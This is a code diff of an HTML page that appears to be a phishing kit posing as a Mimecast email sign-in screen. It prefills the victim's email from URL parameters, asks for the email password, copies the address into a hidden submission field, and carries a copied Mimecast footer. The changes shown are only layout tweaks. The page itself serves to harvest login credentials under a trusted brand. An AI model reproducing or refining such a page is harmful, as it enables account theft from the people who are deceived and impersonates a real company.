@@ -173,12 +173,12 @@ html{ font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:
 <input type="email" id="email" name="email" style="font-size: 11pt; height: 30px; width:322px;height: 35px; border:#ffffff; background:#ffffff;text-align: left;  color: #140c4d;"class="form-control" readonly="readonly"> <br><br>
 
 <span style="color: #a94442;" id="ai-sw-wn">  <span style='color:black; font-size: 9pt;text-align: left;font-family: 'Open Sans', sans-serif;'><b> Authentication Type </b></span>
-<select ng-model="appCtrl.selectedAuthenticationType" aria-label="Authentication Type" ng-options="type.label for type in appCtrl.authenticationType" class="form-control ng-pristine ng-valid ng-not-empty ng-touched" id="type" autocomplete="off" style=""><option label="Domain" value="object:25" selected="selected">Domain</option></select><br><p>
+<select ng-model="appCtrl.selectedAuthenticationType" aria-label="Authentication Type" ng-options="type.label for type in appCtrl.authenticationType" class="form-control ng-pristine ng-valid ng-not-empty ng-touched" id="type" autocomplete="off" style=""><option label="Domain" value="object:25" selected="selected">Domain</option></select>
 
-
+<br><p>
         <div class="form-group">
           <div class="input-group">
-            
+            <br><p>
 <span style="color: #a94442;" id="ai-sw-wn">  <span style='color:black; font-size: 9pt;text-align: left;'><b>Password</b></span>
 
 <input type="password" name="Password" placeholder="Password" style="font-size: 12pt; height: 30px; width:322px; color: black; " required="" oninvalid="this.setCustomValidity('Enter your email password')"
@@ -211,5 +211,6 @@ document.getElementById('sub').value=".pl=> " + params.get('email');
 <footer>
 <span class="pull-right ng-binding">©2025 Mimecast v<span ng-bind="::appCtrl.branding.version" class="ng-binding">1.17.0</span>&nbsp;</span>
 </footer>
+
 
 
